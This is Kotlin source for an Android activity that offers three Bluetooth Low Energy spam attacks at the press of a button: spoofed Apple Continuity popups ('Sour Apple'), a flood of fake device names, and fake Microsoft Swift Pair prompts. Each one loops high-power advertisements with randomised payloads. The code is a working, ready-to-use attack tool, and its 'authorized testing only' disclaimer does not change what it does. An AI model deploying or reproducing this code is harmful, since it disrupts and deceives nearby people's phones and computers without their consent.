package com.ghostech.blehound

import android.app.Activity
import android.app.AlertDialog
import android.bluetooth.BluetoothManager
import android.bluetooth.le.AdvertiseCallback
import android.bluetooth.le.AdvertiseSettings
import android.bluetooth.le.BluetoothLeAdvertiser
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.widget.Button
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView

class OffensiveToolsActivity : Activity() {

    private var advertiser: BluetoothLeAdvertiser? = null
    private var isAttacking = false
    private val handler = Handler(Looper.getMainLooper())
    private var statusText: TextView? = null
    private var packetsText: TextView? = null
    private var packetCount = 0
    private var currentCallback: AdvertiseCallback? = null

    private val appleDevices = listOf(
        byteArrayOf(0x10, 0x05, 0x01),
        byteArrayOf(0x10, 0x02, 0x20),
        byteArrayOf(0x10, 0x0A, 0x20),
        byteArrayOf(0x10, 0x0E, 0x20),
        byteArrayOf(0x10, 0x14, 0x20),
        byteArrayOf(0x10, 0x00, 0x55),
    )

    private val appleActions = listOf(
        byteArrayOf(0x09, 0x01),
        byteArrayOf(0x06, 0x02),
        byteArrayOf(0x0B, 0x01),
        byteArrayOf(0x0D, 0x04),
        byteArrayOf(0x07, 0x06),
        byteArrayOf(0x14, 0x06),
    )

    private val spamNames = listOf(
        "\uD83D\uDC1D nyanbee", "\uD83D\uDC1D BUZZ BUZZ", "\uD83C\uDF6F Honey Trap",
        "\uD83D\uDC1D Queen Bee", "\uD83D\uDC1D The Hive", "\uD83D\uDC1D Stinger",
        "\uD83D\uDC1D Hivemind", "\uD83D\uDC1D CK42X.COM",
        "Free WiFi", "AirDrop - iPhone", "Galaxy Buds Pro",
        "FBI Van #3", "Crypto Wallet", "Toilet"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val btManager = getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager
        advertiser = btManager.adapter?.bluetoothLeAdvertiser

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(0xFF000000.toInt())
        }

        val header = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(18), dp(24), dp(18), dp(14))
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFF2A0000.toInt(), 0xFF140000.toInt(), 0xFF000000.toInt())
            ).apply { setStroke(dp(1), themeColor(this@OffensiveToolsActivity)) }
        }

        val title = TextView(this).apply {
            text = "OFFENSIVE TOOLS"
            gravity = Gravity.CENTER
            textSize = 20f
            typeface = Typeface.create("sans-serif-black", Typeface.BOLD_ITALIC)
            setTextColor(themeColor(this@OffensiveToolsActivity))
        }
        val subtitle = TextView(this).apply {
            text = "BLE advertisement attacks"
            gravity = Gravity.CENTER
            textSize = 11f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF888888.toInt())
            setPadding(0, dp(4), 0, 0)
        }
        header.addView(title)
        header.addView(subtitle)

        val scroll = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 0, 1f
            )
        }
        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(24))
        }

        statusText = TextView(this).apply {
            text = "IDLE"
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFF44FF44.toInt())
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(4))
        }
        packetsText = TextView(this).apply {
            text = "Packets: 0"
            textSize = 11f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF666666.toInt())
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(12))
        }
        content.addView(statusText)
        content.addView(packetsText)

        val sourAppleBtn = buildAttackButton("SOUR APPLE", "Spoof Apple Continuity popups on nearby iOS devices")
        sourAppleBtn.setOnClickListener { confirmAndRun("Sour Apple") { startSourApple() } }
        content.addView(sourAppleBtn)

        val bleFloodBtn = buildAttackButton("BLE FLOOD", "Flood nearby Bluetooth lists with fake device names")
        bleFloodBtn.setOnClickListener { confirmAndRun("BLE Flood") { startBleFlood() } }
        content.addView(bleFloodBtn)

        val swiftPairBtn = buildAttackButton("SWIFT PAIR", "Trigger Windows/Android pairing popups")
        swiftPairBtn.setOnClickListener { confirmAndRun("Swift Pair") { startSwiftPair() } }
        content.addView(swiftPairBtn)

        val stopBtn = Button(this).apply {
            text = "STOP ATTACK"
            isAllCaps = true
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFF000000.toInt())
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFFFF4444.toInt(), 0xFFCC0000.toInt())
            ).apply { cornerRadius = dp(18).toFloat() }
            setPadding(dp(10), dp(16), dp(10), dp(16))
        }
        stopBtn.setOnClickListener { stopAttack() }
        content.addView(stopBtn)

        content.addView(TextView(this).apply {
            text = "For authorized security testing only."
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF444444.toInt())
            setPadding(0, dp(16), 0, 0)
            gravity = Gravity.CENTER
        })

        scroll.addView(content)

        val backContainer = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(0), dp(16), dp(20))
        }
        val backBtn = buildHellButton("BACK")
        backBtn.setOnClickListener { finish() }
        backContainer.addView(backBtn)

        root.addView(header)
        root.addView(scroll)
        root.addView(backContainer)
        setContentView(root)
    }

    private fun confirmAndRun(name: String, action: () -> Unit) {
        if (isAttacking) { stopAttack(); return }
        if (advertiser == null) {
            statusText?.text = "BLE ADVERTISE NOT AVAILABLE"
            statusText?.setTextColor(0xFFFF4444.toInt())
            return
        }
        if (checkSelfPermission(android.Manifest.permission.BLUETOOTH_ADVERTISE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(arrayOf(android.Manifest.permission.BLUETOOTH_ADVERTISE), 100)
            return
        }
        AlertDialog.Builder(this)
            .setTitle("Launch $name?")
            .setMessage("This will broadcast BLE advertisements. For authorized testing only.")
            .setNegativeButton("Cancel", null)
            .setPositiveButton("Launch") { _, _ ->
                packetCount = 0
                isAttacking = true
                statusText?.text = "$name ACTIVE"
                statusText?.setTextColor(0xFFFF4444.toInt())
                action()
            }
            .show()
    }

    // Stop current ad, wait, then start new one
    private fun safeAdvertise(data: android.bluetooth.le.AdvertiseData) {
        try {
            // Stop previous
            currentCallback?.let {
                advertiser?.stopAdvertising(it)
            }
        } catch (_: SecurityException) {}

        currentCallback = object : AdvertiseCallback() {
            override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                runOnUiThread {
                    packetCount++
                    packetsText?.text = "Packets: $packetCount"
                }
            }
            override fun onStartFailure(errorCode: Int) {
                runOnUiThread {
                    packetsText?.text = "Error code: $errorCode (${errorName(errorCode)})"
                }
            }
        }

        val settings = AdvertiseSettings.Builder()
            .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
            .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
            .setConnectable(false)
            .setTimeout(0)
            .build()

        try {
            advertiser?.startAdvertising(settings, data, currentCallback)
        } catch (_: SecurityException) {
            statusText?.text = "PERMISSION DENIED"
            isAttacking = false
        }
    }

    private fun errorName(code: Int) = when(code) {
        1 -> "DATA_TOO_LARGE"
        2 -> "TOO_MANY_ADVERTISERS"
        3 -> "ALREADY_STARTED"
        4 -> "INTERNAL_ERROR"
        5 -> "FEATURE_UNSUPPORTED"
        else -> "UNKNOWN"
    }

    // ─── SOUR APPLE ───
    private fun startSourApple() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val device = appleDevices.random()
                val action = appleActions.random()

                val mfgData = ByteArray(17)
                mfgData[0] = 0x02
                mfgData[1] = 0x15
                System.arraycopy(device, 0, mfgData, 2, device.size.coerceAtMost(3))
                System.arraycopy(action, 0, mfgData, 5, action.size.coerceAtMost(2))
                for (i in 7 until mfgData.size) mfgData[i] = (Math.random() * 256).toInt().toByte()

                val data = BleAdvertiseHelper.buildManufacturerData(0x004C, mfgData)
                safeAdvertise(data)

                handler.postDelayed(this, 300)
            }
        }
        handler.post(runnable)
    }

    // ─── BLE FLOOD ───
    private fun startBleFlood() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val name = spamNames.random()
                try {
                    val adapter = (getSystemService(Context.BLUETOOTH_SERVICE) as BluetoothManager).adapter
                    adapter?.setName(name.take(20))
                } catch (_: SecurityException) {}

                val settings = AdvertiseSettings.Builder()
                    .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                    .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                    .setConnectable(false)
                    .setTimeout(0)
                    .build()

                val data = android.bluetooth.le.AdvertiseData.Builder()
                    .setIncludeDeviceName(true)
                    .setIncludeTxPowerLevel(false)
                    .build()

                try {
                    currentCallback?.let { advertiser?.stopAdvertising(it) }
                } catch (_: SecurityException) {}

                currentCallback = object : AdvertiseCallback() {
                    override fun onStartSuccess(settingsInEffect: AdvertiseSettings?) {
                        runOnUiThread {
                            packetCount++
                            packetsText?.text = "Packets: $packetCount | $name"
                        }
                    }
                    override fun onStartFailure(errorCode: Int) {
                        runOnUiThread { packetsText?.text = "Error: ${errorName(errorCode)}" }
                    }
                }

                try {
                    advertiser?.startAdvertising(settings, data, currentCallback)
                } catch (_: SecurityException) {
                    statusText?.text = "PERMISSION DENIED"
                    isAttacking = false
                }

                handler.postDelayed(this, 500)
            }
        }
        handler.post(runnable)
    }

    // ─── SWIFT PAIR ───
    private fun startSwiftPair() {
        val runnable = object : Runnable {
            override fun run() {
                if (!isAttacking) return

                val mfgData = byteArrayOf(
                    0x03, 0x00, 0x80.toByte(), 0x00,
                    (Math.random() * 256).toInt().toByte(),
                    (Math.random() * 256).toInt().toByte()
                )

                val data = BleAdvertiseHelper.buildManufacturerData(0x0006, mfgData)
                safeAdvertise(data)

                handler.postDelayed(this, 300)
            }
        }
        handler.post(runnable)
    }

    private fun stopAttack() {
        isAttacking = false
        handler.removeCallbacksAndMessages(null)
        try {
            currentCallback?.let { advertiser?.stopAdvertising(it) }
        } catch (_: SecurityException) {}
        currentCallback = null
        statusText?.text = "STOPPED"
        statusText?.setTextColor(0xFF44FF44.toInt())
    }

    override fun onDestroy() {
        stopAttack()
        super.onDestroy()
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        if (requestCode == 100 && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            statusText?.text = "PERMISSION GRANTED. TAP AGAIN."
            statusText?.setTextColor(0xFF44FF44.toInt())
        }
    }

    private fun buildAttackButton(label: String, desc: String): LinearLayout {
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            background = GradientDrawable(
                GradientDrawable.Orientation.TOP_BOTTOM,
                intArrayOf(0xFF4A0000.toInt(), 0xFF1A0000.toInt())
            ).apply {
                cornerRadius = dp(18).toFloat()
                setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
            }
            setPadding(dp(16), dp(14), dp(16), dp(14))
            val lp = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
            lp.setMargins(0, 0, 0, dp(8))
            layoutParams = lp
            isClickable = true
            isFocusable = true
        }
        container.addView(TextView(this).apply {
            text = label
            textSize = 14f
            typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
            setTextColor(0xFFFFF1E0.toInt())
        })
        container.addView(TextView(this).apply {
            text = desc
            textSize = 10f
            typeface = Typeface.MONOSPACE
            setTextColor(0xFF888888.toInt())
            setPadding(0, dp(2), 0, 0)
        })
        return container
    }

    private fun buildHellButton(label: String) = Button(this).apply {
        text = label
        isAllCaps = true
        textSize = 13f
        typeface = Typeface.create(Typeface.MONOSPACE, Typeface.BOLD)
        setTextColor(0xFFFFF1E0.toInt())
        background = GradientDrawable(
            GradientDrawable.Orientation.TOP_BOTTOM,
            intArrayOf(0xFF6A0000.toInt(), 0xFF260000.toInt())
        ).apply {
            cornerRadius = dp(18).toFloat()
            setStroke(dp(1), themeColor(this@OffensiveToolsActivity))
        }
        setPadding(dp(10), dp(14), dp(10), dp(14))
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()
}
